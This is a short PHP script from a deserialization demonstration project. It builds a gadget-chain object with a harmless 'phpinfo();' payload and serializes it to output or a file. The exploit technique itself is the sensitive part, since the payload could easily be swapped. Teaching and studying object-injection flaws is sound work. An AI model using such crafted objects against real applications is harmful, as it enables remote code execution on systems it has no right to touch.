#!/usr/bin/env php
<?php
/* Creates gadget chain exploit to STDOUT or file.
   The class definition is read from chainobject.php.

   SPDX-License-Identifier: GPL-3.0-or-later

   This file is part of the deserialization demos:
   https://github.com/PeterMosmans/deserialization-demos
 */

include "chainobject.php";

$object = new Initial();
$secondary = new Secondary();
$secondary->payload = "phpinfo();";
$object->secondary = $secondary;
$serialized = serialize($object);

if ($argc < 2) {
    /* Write to STDOUT */
    print $serialized;
} else {
    /* Write to file */
    $filename = $argv[1];
    file_put_contents($filename, $serialized);
    print "Object serialized and saved to " . $filename . "\n";
}


?>
